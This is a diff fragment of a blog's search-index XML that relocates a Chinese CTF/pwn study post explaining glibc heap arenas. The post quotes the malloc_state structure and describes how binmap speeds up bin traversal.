+<ul>
+<li>当需要遍历bin时，可以转而遍历binmap，以减小直接遍历bin时的 <strong>内存页载入、搜索、切换到下一个内存页等等</strong> 所带来的时间消耗</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+        <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>heap - 2 - chunk的分类</title>
     <url>/2020/03/heap-2-chunks/</url>
     <content><![CDATA[<p>堆块最小分配的单位 —— malloc_chunk !</p>
@@ -15450,40 +15484,6 @@ bins --> large[Large bins]</pre>
 <ul>
 <li>当用户请求的是一个small chunk，并且该请求无法被small bin和unsorted bin满足</li>
 <li>此时查找最合适的chunk，并把该chunk切割，剩余部分放入unsorted bin里并成为新的last remainder</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pwn</tag>
-        <tag>Heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>heap - 1 - arena</title>
-    <url>/2020/03/heap-1-arena/</url>
-    <content><![CDATA[<p>堆的 <strong>管理者</strong></p>
-<h2 id="1-什么是-arena">1. 什么是 arena</h2>
-<p>堆，是内存分配所用的内存，在计算机世界中是一种比较复杂的部件，里面有大量的信息需要被管理<br>
-而<code>arena</code>，就是管理堆的一个结构</p>
-<h2 id="2-arena-的特点">2. arena 的特点</h2>
-<p>一个线程只有一个<code>arena</code>，这些<code>arena</code>是互不相同的。<br>
-主线程的<code>arena</code>称为<code>main_arena</code>，子线程的<code>arena</code>称为<code>thread_arena</code>。</p>
-<a id="more"></a>
-<h2 id="3-arena-的数量限制">3. arena 的数量限制</h2>
-<p>并不是每个线程都有一个<code>arena</code>，其个数是有限制的。</p>
-<blockquote>
-<p>由于笔者在写这篇文章时，所涉猎的堆漏洞类型暂时没有涉及arena的其他知识，故此处留坑。</p>
-</blockquote>
-<h2 id="4-arena-的实现">4. arena 的实现</h2>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ----------- Internal state representation and initialization -----------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>glibc中的<code>arena</code>使用的就是此结构体。</li>
-<li>该结构体包含了各种信息，例如<code>bin</code>链的头地址、<code>topchunk</code>的地址以及<code>last remainder</code>地址等等</li>
-<li>成员binmap用于记录bin的相关信息，例如某个bin是否为空
-<ul>
-<li>当需要遍历bin时，可以转而遍历binmap，以减小直接遍历bin时的 <strong>内存页载入、搜索、切换到下一个内存页等等</strong> 所带来的时间消耗</li>
-</ul>
-</li>
 </ul>
 ]]></content>
       <tags>
